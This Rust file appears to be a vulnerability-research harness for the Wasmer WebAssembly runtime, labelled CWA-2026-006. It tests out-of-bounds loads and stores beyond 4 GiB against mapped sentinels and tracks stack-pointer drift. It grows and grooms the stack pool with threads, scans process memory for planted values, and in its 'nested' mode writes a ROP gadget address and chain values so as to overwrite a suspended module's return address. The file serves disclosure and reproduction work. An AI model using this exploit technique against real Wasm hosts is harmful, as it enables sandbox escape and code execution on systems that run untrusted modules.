// CWA-2026-006 differential runner.
// Modes:
//   patterns            -> static-memory guard sentinel test (R1)
//   run <file.wat>      -> execute all zero-arg exported functions, print JSON
//
// Built once per engine (see Cargo.toml feature selection in each lab-* crate).
use libc::{c_void, mmap, MAP_ANONYMOUS, MAP_FIXED_NOREPLACE, MAP_PRIVATE, PROT_READ, PROT_WRITE};
use std::env;
use std::fs;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Mutex;
use wasmer::{Function, Instance, Imports, Module, Store};

// wasmer-vm 4.2.2 references __rust_probestack, which modern Rust's compiler_builtins
// no longer exports. Provide a minimal stub (only for the 4.2.2 lab crate).
#[cfg(all(target_arch = "x86_64", feature = "probestack-stub"))]
core::arch::global_asm!(
    ".globl __rust_probestack",
    "__rust_probestack:",
    "ret",
);

const PATTERN_WAT: &str = r#"
(module
  (memory (export "memory") 1 512)
  (func (export "load_at_4gib") (result i64)
    (i64.load offset=2147483648 (i32.const -2147483648)))
  (func (export "load_at_5gib") (result i64)
    (i64.load offset=2147483648 (i32.const -1073741824)))
  (func (export "load_at_6gib") (result i64)
    (i64.load offset=4294967295 (i32.const -2147483647)))
  (func (export "load_at_7gib") (result i64)
    (i64.load offset=4294967295 (i32.const -1073741823)))
  (func (export "load_at_8gib") (result i64)
    (i64.load offset=4294967295 (i32.const -1)))
  (func (export "store_at_7gib") (param i64)
    (i64.store offset=4294967295 (i32.const -1073741823) (local.get 0)))
)
"#;

const GIB: usize = 1 << 30;

// E4 holder module: stages distinctive i64 values, then suspends inside the
// `env.query` host import while the trigger runs on the stack directly above.
// The return address of that call is the overwrite target.
const HOLDER_WAT: &str = r#"
(module
  (import "env" "query" (func $q (param i32) (result i32)))
  (memory 1)
  (func (export "run") (param $tag i32) (result i32)
    (local $a i64) (local $b i64) (local $c i64) (local $d i64)
    (local.set $a (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1111)))
    (local.set $b (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x2222)))
    (local.set $c (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x3333)))
    (local.set $d (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x4444)))
    (call $q (local.get $tag))
    drop
    (i64.add (i64.add (local.get $a) (local.get $b)) (i64.add (local.get $c) (local.get $d)))
    drop
    (i32.const 0)))
"#;

static NESTED_B_STORE: Mutex<usize> = Mutex::new(0);
static NESTED_B_FUNC: Mutex<usize> = Mutex::new(0);
static NESTED_B_ITERS: AtomicU64 = AtomicU64::new(0);

// ---------------- rsp drift probe (Hexens WASMageddon shape) ----------------

#[cfg(target_arch = "x86_64")]
fn read_rsp() -> u64 {
    let rsp: u64;
    unsafe {
        core::arch::asm!("mov {}, rsp", out(reg) rsp, options(nomem, nostack, preserves_flags));
    }
    rsp
}
#[cfg(not(target_arch = "x86_64"))]
fn read_rsp() -> u64 {
    0
}

static PROBE_CALLS: AtomicU64 = AtomicU64::new(0);
static PROBE_FIRST: AtomicU64 = AtomicU64::new(0);
static PROBE_LAST: AtomicU64 = AtomicU64::new(0);
static PROBE_MIN: AtomicU64 = AtomicU64::new(u64::MAX);
static PROBE_MAX: AtomicU64 = AtomicU64::new(0);

fn probe() -> i32 {
    let rsp = read_rsp();
    let n = PROBE_CALLS.fetch_add(1, Ordering::Relaxed);
    if n == 0 {
        PROBE_FIRST.store(rsp, Ordering::Relaxed);
    }
    PROBE_LAST.store(rsp, Ordering::Relaxed);
    PROBE_MIN.fetch_min(rsp, Ordering::Relaxed);
    PROBE_MAX.fetch_max(rsp, Ordering::Relaxed);
    0
}

fn drift(path: &str, iters: i32) {
    let src = match fs::read(path) {
        Ok(b) => b,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"read: {}\"}}", path, e);
            return;
        }
    };
    let mut store = Store::new(engine());
    let module = match Module::new(&store, &src) {
        Ok(m) => m,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"compile: {}\"}}", path, norm_err(&e));
            return;
        }
    };
    let mut imports = Imports::new();
    imports.define(
        "env",
        "probe",
        Function::new_typed(&mut store, |_: i32, _: i32, _: i32| -> i32 { probe() }),
    );
    let instance = match Instance::new(&mut store, &module, &imports) {
        Ok(i) => i,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"instantiate: {}\"}}", path, norm_err(&e));
            return;
        }
    };
    let f = match instance.exports.get_function("run") {
        Ok(f) => f,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"no run export: {}\"}}", path, norm_err(&e));
            return;
        }
    };
    let res = f.call(&mut store, &[wasmer::Value::I32(iters)]);
    let calls = PROBE_CALLS.load(Ordering::Relaxed);
    let first = PROBE_FIRST.load(Ordering::Relaxed);
    let last = PROBE_LAST.load(Ordering::Relaxed);
    let min = PROBE_MIN.load(Ordering::Relaxed);
    let max = PROBE_MAX.load(Ordering::Relaxed);
    let result = match &res {
        Ok(_) => "ok".to_string(),
        Err(e) => norm_err(e),
    };
    println!(
        "{{\"pattern\":\"{}\",\"iters\":{},\"calls\":{},\"result\":\"{}\",\"rsp_first\":\"0x{:x}\",\"rsp_last\":\"0x{:x}\",\"rsp_min\":\"0x{:x}\",\"rsp_max\":\"0x{:x}\",\"drift\":{}}}",
        path,
        iters,
        calls,
        result,
        first,
        last,
        min,
        max,
        first as i64 - last as i64
    );
}

// ---------------- E1: write-stream detector ----------------
//
// The host callback runs on the host stack (on_host_stack), so it cannot see
// the guest rsp. Instead it scans the fiber-stack mapping for the distinctive
// live values (i << 32) | K that `push_used_gpr` writes at the drifted rsp
// before each host call.

#[derive(Clone)]
struct WsScan {
    i: u64,
    hits: u64,
    min_addr: u64,
    max_addr: u64,
    addr_k0: u64,
    candidates: u64,
    maps_note: String,
    map_hits: String,
}

static WS_SCANS: Mutex<Vec<WsScan>> = Mutex::new(Vec::new());
static WS_CALLS: AtomicU64 = AtomicU64::new(0);
static WS_EXCL_LO: AtomicU64 = AtomicU64::new(0);
static WS_EXCL_HI: AtomicU64 = AtomicU64::new(0);
static WS_LAST: Mutex<String> = Mutex::new(String::new());

// Fault handler: installed BEFORE Store::new so wasmer's platform_init (called from
// Store::new) saves it as the previous handler and forwards non-wasm faults to us.
extern "C" fn ws_segv(sig: libc::c_int, info: *mut libc::siginfo_t, _ctx: *mut libc::c_void) {
    let addr = if info.is_null() {
        0usize
    } else {
        unsafe { (*info).si_addr() as usize }
    };
    let last = WS_LAST.lock().map(|s| s.clone()).unwrap_or_default();
    eprintln!(
        "CRASH {{\"sig\":{},\"fault_addr\":\"0x{:x}\",\"last_scan\":{}}}",
        sig, addr, last
    );
    unsafe { libc::_exit(139) };
}

fn install_ws_handlers() {
    unsafe {
        let mut sa: libc::sigaction = core::mem::zeroed();
        sa.sa_sigaction = ws_segv as usize;
        sa.sa_flags = libc::SA_SIGINFO;
        libc::sigemptyset(&mut sa.sa_mask);
        libc::sigaction(libc::SIGSEGV, &sa, core::ptr::null_mut());
        libc::sigaction(libc::SIGBUS, &sa, core::ptr::null_mut());
    }
}

fn read_rw_maps() -> Vec<(u64, u64, String)> {
    let mut out = Vec::new();
    if let Ok(s) = fs::read_to_string("/proc/self/maps") {
        for line in s.lines() {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 2 || !fields[1].starts_with("rw") {
                continue;
            }
            let mut rp = fields[0].split('-');
            let (lo, hi) = match (rp.next(), rp.next()) {
                (Some(a), Some(b)) => (
                    u64::from_str_radix(a, 16).unwrap_or(0),
                    u64::from_str_radix(b, 16).unwrap_or(0),
                ),
                _ => continue,
            };
            let tag = format!("{} {}", fields[1], fields.get(5).copied().unwrap_or(""));
            out.push((lo, hi, tag));
        }
    }
    out
}

fn ws_scan(i: i32) {
    let iu = i as u64;
    let excl_lo = WS_EXCL_LO.load(Ordering::Relaxed);
    let excl_hi = WS_EXCL_HI.load(Ordering::Relaxed);
    let mut rec = WsScan {
        i: iu,
        hits: 0,
        min_addr: u64::MAX,
        max_addr: 0,
        addr_k0: 0,
        candidates: 0,
        maps_note: String::new(),
        map_hits: String::new(),
    };
    let mut maps_full = String::new();
    for (lo, hi, tag) in read_rw_maps() {
        let size = hi.saturating_sub(lo);
        if !(256 * 1024..=32 * 1024 * 1024).contains(&size) {
            continue;
        }
        if tag.contains("[stack]") || tag.contains("[heap]") {
            continue;
        }
        if lo < excl_hi && hi > excl_lo {
            continue; // overlaps the wasm linear memory
        }
        rec.candidates += 1;
        if maps_full.len() < 600 {
            maps_full.push_str(&format!("0x{:x}-0x{:x} {};", lo, hi, tag));
        }
        if rec.maps_note.len() < 200 {
            rec.maps_note
                .push_str(&format!("{}@0x{:x}-0x{:x};", tag, lo, hi));
        }
        let mut map_hits: u64 = 0;
        let mut addr = lo;
        while addr + 8 <= hi {
            let v = unsafe { core::ptr::read_volatile(addr as *const u64) };
            let pattern_hit = (v >> 32) == iu && (v & 0xffff_ffff) < 64;
            let pivot_hit = (v & 0xffff_ffff_ffff_ff00) == 0x0041_4141_4141_4100;
            if pattern_hit || pivot_hit {
                rec.hits += 1;
                map_hits += 1;
                if addr < rec.min_addr {
                    rec.min_addr = addr;
                }
                if addr > rec.max_addr {
                    rec.max_addr = addr;
                }
                if (v & 0xffff_ffff) == 0 || (v & 0xff) == 0 {
                    rec.addr_k0 = addr;
                }
            }
            addr += 8;
        }
        if map_hits > 0 {
            rec.map_hits
                .push_str(&format!("0x{:x}-0x{:x}:{};", lo, hi, map_hits));
        }
    }
    if let Ok(mut v) = WS_SCANS.lock() {
        if v.len() < 256 {
            v.push(rec.clone());
        }
    }
    // Unbuffered per-scan line: survives a SIGSEGV (the process may crash when the
    // stream crosses into another stack's guard/unmapped region).
    let line = format!(
        "SCAN {{\"i\":{},\"hits\":{},\"min\":\"0x{:x}\",\"max\":\"0x{:x}\",\"k0\":\"0x{:x}\",\"candidates\":{},\"map_hits\":\"{}\",\"maps\":\"{}\"}}",
        rec.i, rec.hits, rec.min_addr, rec.max_addr, rec.addr_k0, rec.candidates, rec.map_hits, maps_full
    );
    if let Ok(mut l) = WS_LAST.lock() {
        *l = line.clone();
    }
    eprintln!("{}", line);
}

// Grow the global wasmer stack pool with N simultaneous executions: each thread holds
// its coroutine stack inside the host-import barrier until all N are in flight, then all
// complete and push their stacks to STACK_POOL. Later executions pop from this pool, so
// the trigger can land on a stack that has a mapped neighbour below it.
fn grow_pool(wasm: &[u8], n: usize) {
    use std::sync::{Arc, Barrier};
    let barrier = Arc::new(Barrier::new(n));
    let mut handles = Vec::new();
    for _ in 0..n {
        let b = barrier.clone();
        let bytes = wasm.to_vec();
        handles.push(std::thread::spawn(move || {
            let mut store = Store::new(engine());
            let module = match Module::new(&store, &bytes) {
                Ok(m) => m,
                Err(_) => return,
            };
            let mut imports = Imports::new();
            let b2 = b.clone();
            imports.define(
                "env",
                "probe",
                Function::new_typed(&mut store, move |_i: i32, _: i32, _: i32| -> i32 {
                    b2.wait();
                    0
                }),
            );
            if let Ok(instance) = Instance::new(&mut store, &module, &imports) {
                if let Ok(f) = instance.exports.get_function("run") {
                    let _ = f.call(&mut store, &[wasmer::Value::I32(1)]);
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
}

fn writestream(path: &str, iters: i32, stride: u64, warm_path: Option<&str>, warm_threads: usize) {
    let src = match fs::read(path) {
        Ok(b) => b,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"read: {}\"}}", path, e);
            return;
        }
    };
    if warm_threads > 0 {
        if let Some(wpath) = warm_path {
            match fs::read(wpath) {
                Ok(wbytes) => {
                    eprintln!("WARM growing pool with {} threads using {}", warm_threads, wpath);
                    grow_pool(&wbytes, warm_threads);
                    eprintln!("WARM pool grown");
                }
                Err(e) => eprintln!("WARM read {} failed: {}", wpath, e),
            }
        }
        // Sacrificial run: consume the pool front (the lowest stack, no neighbour below)
        // so the trigger pops a stack that has a mapped neighbour directly below it.
        {
            let mut store = Store::new(engine());
            if let Ok(module) = Module::new(&store, &src) {
                let mut imports = Imports::new();
                imports.define(
                    "env",
                    "probe",
                    Function::new_typed(&mut store, |_: i32, _: i32, _: i32| -> i32 { 0 }),
                );
                if let Ok(instance) = Instance::new(&mut store, &module, &imports) {
                    if let Ok(f) = instance.exports.get_function("run") {
                        let _ = f.call(&mut store, &[wasmer::Value::I32(1000)]);
                        eprintln!("WARM sacrificial run done");
                    }
                }
            }
        }
    }
    // Must be installed before Store::new (wasmer's init_traps runs there and chains
    // to the previously installed handler).
    install_ws_handlers();
    let mut store = Store::new(engine());
    let module = match Module::new(&store, &src) {
        Ok(m) => m,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"compile: {}\"}}", path, norm_err(&e));
            return;
        }
    };
    let mut imports = Imports::new();
    imports.define(
        "env",
        "probe",
        Function::new_typed(&mut store, move |i: i32, _: i32, _: i32| -> i32 {
            let _n = WS_CALLS.fetch_add(1, Ordering::Relaxed);
            let iu = i as u64;
            if stride == 0 || iu % stride == 0 || iu + 1 >= iters as u64 {
                ws_scan(i);
            }
            0
        }),
    );
    let instance = match Instance::new(&mut store, &module, &imports) {
        Ok(i) => i,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"instantiate: {}\"}}", path, norm_err(&e));
            return;
        }
    };
    if let Ok(mem) = instance.exports.get_memory("memory") {
        let view = mem.view(&store);
        let base = view.data_ptr() as u64;
        WS_EXCL_LO.store(base, Ordering::Relaxed);
        WS_EXCL_HI.store(base + view.data_size(), Ordering::Relaxed);
    }
    let f = match instance.exports.get_function("run") {
        Ok(f) => f,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"no run export: {}\"}}", path, norm_err(&e));
            return;
        }
    };
    let res = f.call(&mut store, &[wasmer::Value::I32(iters)]);
    let result = match &res {
        Ok(_) => "ok".to_string(),
        Err(e) => norm_err(e),
    };
    let calls = WS_CALLS.load(Ordering::Relaxed);
    let scans = WS_SCANS.lock().map(|v| v.clone()).unwrap_or_default();
    println!(
        "{{\"pattern\":\"{}\",\"iters\":{},\"calls\":{},\"result\":\"{}\",\"scans\":[",
        path, iters, calls, result
    );
    for (n, s) in scans.iter().enumerate() {
        let comma = if n + 1 < scans.len() { "," } else { "" };
        println!(
            "{{\"i\":{},\"hits\":{},\"min\":\"0x{:x}\",\"max\":\"0x{:x}\",\"k0\":\"0x{:x}\",\"candidates\":{},\"maps\":\"{}\",\"map_hits\":\"{}\"}}{}",
            s.i, s.hits, s.min_addr, s.max_addr, s.addr_k0, s.candidates, s.maps_note, s.map_hits, comma
        );
    }
    println!("]}}");
}

// Resolve the runtime base of the current executable's first executable mapping
// (PIE binaries: runtime address = base + ELF vaddr).
fn find_binary_base() -> u64 {
    let exe = match fs::read_link("/proc/self/exe") {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return 0,
    };
    if let Ok(s) = fs::read_to_string("/proc/self/maps") {
        for line in s.lines() {
            if !line.contains(&exe) {
                continue;
            }
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 6 || !fields[1].contains('x') {
                continue;
            }
            let mut rp = fields[0].split('-');
            let start = rp
                .next()
                .and_then(|a| u64::from_str_radix(a, 16).ok())
                .unwrap_or(0);
            let off = u64::from_str_radix(fields[2], 16).unwrap_or(0);
            return start.saturating_sub(off);
        }
    }
    0
}

// ---------------- E4: nested holder/trigger (targeted overwrite) ----------------

fn nested(
    trigger_path: &str,
    iters: i32,
    stride: u64,
    warm_path: Option<&str>,
    warm_threads: usize,
    tag: i32,
    gadget_off: Option<u64>,
    marker: u64,
) {
    let trigger_src = match fs::read(trigger_path) {
        Ok(b) => b,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"read: {}\"}}", trigger_path, e);
            return;
        }
    };
    if warm_threads > 0 {
        if let Some(wpath) = warm_path {
            if let Ok(wbytes) = fs::read(wpath) {
                eprintln!("WARM growing pool with {} threads using {}", warm_threads, wpath);
                grow_pool(&wbytes, warm_threads);
                eprintln!("WARM pool grown");
            }
        }
        // sacrificial run: rotate the pool front so the holder pops a stack whose
        // neighbour below is already mapped
        {
            let mut store = Store::new(engine());
            if let Ok(module) = Module::new(&store, &trigger_src) {
                let mut imports = Imports::new();
                imports.define(
                    "env",
                    "probe",
                    Function::new_typed(&mut store, |_: i32, _: i32, _: i32| -> i32 { 0 }),
                );
                if let Ok(instance) = Instance::new(&mut store, &module, &imports) {
                    if let Ok(f) = instance.exports.get_function("run") {
                        let _ = f.call(&mut store, &[wasmer::Value::I32(1000)]);
                        eprintln!("WARM sacrificial run done");
                    }
                }
            }
        }
    }
    install_ws_handlers();

    // B = trigger (runs nested on the stack above the holder)
    let mut store_b = Store::new(engine());
    let module_b = match Module::new(&store_b, &trigger_src) {
        Ok(m) => m,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"compile trigger: {}\"}}", trigger_path, norm_err(&e));
            return;
        }
    };
    let mut imports_b = Imports::new();
    imports_b.define(
        "env",
        "probe",
        Function::new_typed(&mut store_b, move |i: i32, _: i32, _: i32| -> i32 {
            let _n = WS_CALLS.fetch_add(1, Ordering::Relaxed);
            let iu = i as u64;
            // only scan near/after the guard crossing (saves scanning the whole pool)
            if iu >= 60_000 && (stride == 0 || iu % stride == 0 || iu + 1 >= iters as u64) {
                ws_scan(i);
            }
            0
        }),
    );
    let instance_b = match Instance::new(&mut store_b, &module_b, &imports_b) {
        Ok(i) => i,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"instantiate trigger: {}\"}}", trigger_path, norm_err(&e));
            return;
        }
    };
    let f_b = match instance_b.exports.get_function("run") {
        Ok(f) => f,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"no trigger run: {}\"}}", trigger_path, norm_err(&e));
            return;
        }
    };
    let f_b_ptr: *const Function = f_b;
    if let Ok(mut s) = NESTED_B_STORE.lock() {
        *s = &mut store_b as *mut Store as usize;
    }
    if let Ok(mut f) = NESTED_B_FUNC.lock() {
        *f = f_b_ptr as usize;
    }
    NESTED_B_ITERS.store(iters as u64, Ordering::Relaxed);

    // E6: plant the runtime pivot (gadget address) + chain values into the trigger's memory
    let mut gadget_addr: u64 = 0;
    if let Some(goff) = gadget_off {
        let base = find_binary_base();
        gadget_addr = base + goff;
        if let Ok(mem) = instance_b.exports.get_memory("memory") {
            let view = mem.view(&store_b);
            let mut vals: Vec<u8> = Vec::with_capacity(16 * 8);
            vals.extend_from_slice(&gadget_addr.to_le_bytes()); // slot 0 = gadget
            for _ in 0..15 {
                vals.extend_from_slice(&marker.to_le_bytes()); // slots 1..15 = chain value
            }
            match view.write(64, &vals) {
                Ok(_) => eprintln!(
                    "NESTED planted gadget=0x{:x} marker=0x{:x} (base=0x{:x} off=0x{:x})",
                    gadget_addr, marker, base, goff
                ),
                Err(e) => eprintln!("NESTED plant failed: {:?}", e),
            }
        }
    }

    // A = holder (suspends inside env.query while the trigger runs above it)
    let mut store_a = Store::new(engine());
    let module_a = match Module::new(&store_a, HOLDER_WAT) {
        Ok(m) => m,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"compile holder: {}\"}}", trigger_path, norm_err(&e));
            return;
        }
    };
    let mut imports_a = Imports::new();
    imports_a.define(
        "env",
        "query",
        Function::new_typed(&mut store_a, move |t: i32| -> i32 {
            let sp = NESTED_B_STORE.lock().map(|v| *v).unwrap_or(0);
            let fp = NESTED_B_FUNC.lock().map(|v| *v).unwrap_or(0);
            if sp != 0 && fp != 0 {
                let store = unsafe { &mut *(sp as *mut Store) };
                let f = unsafe { &*(fp as *const Function) };
                let n = NESTED_B_ITERS.load(Ordering::Relaxed) as i32;
                eprintln!("NESTED trigger start");
                let r = f.call(store, &[wasmer::Value::I32(n)]);
                match &r {
                    Ok(_) => eprintln!("NESTED trigger ok"),
                    Err(e) => eprintln!("NESTED trigger err: {}", norm_err(e)),
                }
            }
            t
        }),
    );
    let instance_a = match Instance::new(&mut store_a, &module_a, &imports_a) {
        Ok(i) => i,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"instantiate holder: {}\"}}", trigger_path, norm_err(&e));
            return;
        }
    };
    let f_a = match instance_a.exports.get_function("run") {
        Ok(f) => f,
        Err(e) => {
            println!("{{\"pattern\":\"{}\",\"error\":\"no holder run: {}\"}}", trigger_path, norm_err(&e));
            return;
        }
    };
    eprintln!("NESTED holder start (tag {})", tag);
    let res = f_a.call(&mut store_a, &[wasmer::Value::I32(tag)]);
    let result = match &res {
        Ok(_) => "ok".to_string(),
        Err(e) => norm_err(e),
    };
    eprintln!("NESTED holder returned: {}", result);
    let scans = WS_SCANS.lock().map(|v| v.len()).unwrap_or(0);
    println!(
        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{},\"gadget\":\"0x{:x}\",\"marker\":\"0x{:x}\"}}",
        trigger_path, iters, result, scans, gadget_addr, marker
    );
}

fn try_sentinel(addr: usize, magic: u64) -> Option<usize> {
    unsafe {
        let p = mmap(
            addr as *mut c_void,
            4096,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
            -1,
            0,
        );
        if p == libc::MAP_FAILED {
            return None;
        }
        *(p as *mut u64) = magic;
        Some(p as usize)
    }
}

fn patterns() {
    let mut store = Store::new(engine());
    let module = Module::new(&store, PATTERN_WAT).expect("compile");
    let instance = Instance::new(&mut store, &module, &Imports::new()).expect("instantiate");
    let memory = instance.exports.get_memory("memory").expect("memory");
    let base = memory.view(&store).data_ptr() as usize;
    println!("memory base = 0x{:x}", base);

    let mut sentinels: Vec<(usize, u64)> = Vec::new();
    for (i, off) in [6usize, 7, 8, 9, 10].iter().enumerate() {
        let magic = 0xC0FFEE00_0000_0001u64 + i as u64;
        match try_sentinel(base + off * GIB, magic) {
            Some(p) => {
                println!("sentinel @ base+{}GiB = 0x{:x} (magic 0x{:x})", off, p, magic);
                sentinels.push((p, magic));
            }
            None => println!("sentinel @ base+{}GiB: mmap refused (reserved by engine?)", off),
        }
    }

    for name in [
        "load_at_4gib",
        "load_at_5gib",
        "load_at_6gib",
        "load_at_7gib",
        "load_at_8gib",
    ] {
        let f = instance.exports.get_function(name).expect(name);
        let res: Result<Box<[wasmer::Value]>, _> = f.call(&mut store, &[]);
        match res {
            Ok(vals) => {
                let v = vals[0].i64().unwrap_or(-1);
                let hit = sentinels
                    .iter()
                    .find(|(_, m)| *m == v as u64)
                    .map(|(p, _)| format!("0x{:x}", p))
                    .unwrap_or_else(|| "no".into());
                println!("{}: RETURNED 0x{:x} (sentinel hit: {})", name, v as u64, hit);
            }
            Err(e) => println!(
                "{}: TRAP/ERR ({})",
                name,
                format!("{}", e).lines().next().unwrap_or("")
            ),
        }
    }

    let f = instance.exports.get_function("store_at_7gib").unwrap();
    let magic = 0xDEADBEEF_00000007u64;
    match f.call(&mut store, &[wasmer::Value::I64(magic as i64)]) {
        Ok(_) => {
            let mut found = false;
            for (p, _) in &sentinels {
                let v = unsafe { *(*p as *const u64) };
                if v == magic {
                    println!("store_at_7gib: WROTE 0x{:x} INTO SENTINEL 0x{:x}", magic, p);
                    found = true;
                }
            }
            if !found {
                println!("store_at_7gib: returned Ok but no sentinel was modified");
            }
        }
        Err(e) => println!(
            "store_at_7gib: TRAP/ERR ({})",
            format!("{}", e).lines().next().unwrap_or("")
        ),
    }
}

fn norm_err(e: &dyn std::fmt::Display) -> String {
    let s = format!("{}", e);
    let l = s.to_lowercase();
    if l.contains("out of bounds") || l.contains("trap") || l.contains("unreachable") {
        "trap".to_string()
    } else if l.contains("stack overflow") {
        "stack-overflow".to_string()
    } else {
        let first = s.lines().next().unwrap_or("").to_string();
        format!("err:{}", first.chars().take(120).collect::<String>())
    }
}

fn fmt_value(v: &wasmer::Value) -> String {
    match v {
        wasmer::Value::I32(x) => format!("i32:{}", x),
        wasmer::Value::I64(x) => format!("i64:{}", x),
        wasmer::Value::F32(x) => format!("f32:{}", x),
        wasmer::Value::F64(x) => format!("f64:{}", x),
        other => format!("other:{:?}", other),
    }
}

fn run_file(path: &str) {
    let src = match fs::read(path) {
        Ok(b) => b,
        Err(e) => {
            println!("{{\"file\":\"{}\",\"status\":\"read_err:{}\"}}", path, e);
            return;
        }
    };
    let mut store = Store::new(engine());
    let module = match Module::new(&store, &src) {
        Ok(m) => m,
        Err(e) => {
            println!(
                "{{\"file\":\"{}\",\"status\":\"compile_err\",\"err\":\"{}\"}}",
                path,
                norm_err(&e)
            );
            return;
        }
    };
    let instance = match Instance::new(&mut store, &module, &Imports::new()) {
        Ok(i) => i,
        Err(e) => {
            println!("{{\"file\":\"{}\",\"status\":\"instantiate_err:{}\"}}", path, norm_err(&e));
            return;
        }
    };

    // collect zero-param exported functions, sorted by name
    let mut names: Vec<String> = Vec::new();
    for (name, ext) in instance.exports.iter() {
        if let wasmer::Extern::Function(f) = ext {
            if f.ty(&store).params().len() == 0 {
                names.push(name.to_string());
            }
        }
    }
    names.sort();

    let mut calls: Vec<String> = Vec::new();
    for name in &names {
        let f = instance.exports.get_function(name).unwrap();
        let res: Result<Box<[wasmer::Value]>, _> = f.call(&mut store, &[]);
        match res {
            Ok(vals) => {
                let vs: Vec<String> = vals.iter().map(fmt_value).collect();
                calls.push(format!("{{\"fn\":\"{}\",\"ok\":true,\"values\":[{}]}}", name, vs.join(",")));
            }
            Err(e) => {
                calls.push(format!("{{\"fn\":\"{}\",\"ok\":false,\"err\":\"{}\"}}", name, norm_err(&e)));
            }
        }
    }
    println!(
        "{{\"file\":\"{}\",\"status\":\"ok\",\"calls\":[{}]}}",
        path,
        calls.join(",")
    );
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() >= 2 && args[1] == "patterns" {
        patterns();
    } else if args.len() >= 3 && args[1] == "run" {
        run_file(&args[2]);
    } else if args.len() >= 4 && args[1] == "drift" {
        let iters: i32 = args[3].parse().unwrap_or(1000);
        drift(&args[2], iters);
    } else if args.len() >= 4 && args[1] == "writestream" {
        let iters: i32 = args[3].parse().unwrap_or(1000);
        let stride: u64 = args.get(4).and_then(|s| s.parse().ok()).unwrap_or(4096);
        let warm_path = args.get(5).map(|s| s.as_str());
        let warm_threads: usize = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(0);
        writestream(&args[2], iters, stride, warm_path, warm_threads);
    } else if args.len() >= 4 && args[1] == "nested" {
        let iters: i32 = args[3].parse().unwrap_or(1000);
        let stride: u64 = args.get(4).and_then(|s| s.parse().ok()).unwrap_or(4096);
        let warm_path = args.get(5).map(|s| s.as_str());
        let warm_threads: usize = args.get(6).and_then(|s| s.parse().ok()).unwrap_or(0);
        let tag: i32 = args.get(7).and_then(|s| s.parse().ok()).unwrap_or(1);
        let gadget_off: Option<u64> = args
            .get(8)
            .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok());
        let marker: u64 = args
            .get(9)
            .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
            .unwrap_or(0x4242424242424242);
        nested(&args[2], iters, stride, warm_path, warm_threads, tag, gadget_off, marker);
    } else {
        eprintln!(
            "usage: {} patterns | run <file.wat> | drift <file.wat> <iters> | writestream <file.wat> <iters> [stride] [warm.wat] [warm_threads] | nested <trigger.wat> <iters> [stride] [warm.wat] [warm_threads] [tag]",
            args[0]
        );
        std::process::exit(2);
    }
}

// ---- engine selection (one lab crate per engine; see Cargo.toml) ----
#[cfg(all(feature = "engine-singlepass", feature = "old-wasmer"))]
fn engine() -> wasmer::Singlepass {
    wasmer::Singlepass::default()
}

#[cfg(all(feature = "engine-singlepass", feature = "new-wasmer"))]
fn engine() -> wasmer::sys::Singlepass {
    wasmer::sys::Singlepass::new()
}

#[cfg(all(feature = "engine-cranelift", feature = "old-wasmer"))]
fn engine() -> wasmer::Cranelift {
    wasmer::Cranelift::default()
}

#[cfg(all(feature = "engine-cranelift", feature = "new-wasmer"))]
fn engine() -> wasmer::sys::Cranelift {
    wasmer::sys::Cranelift::default()
}
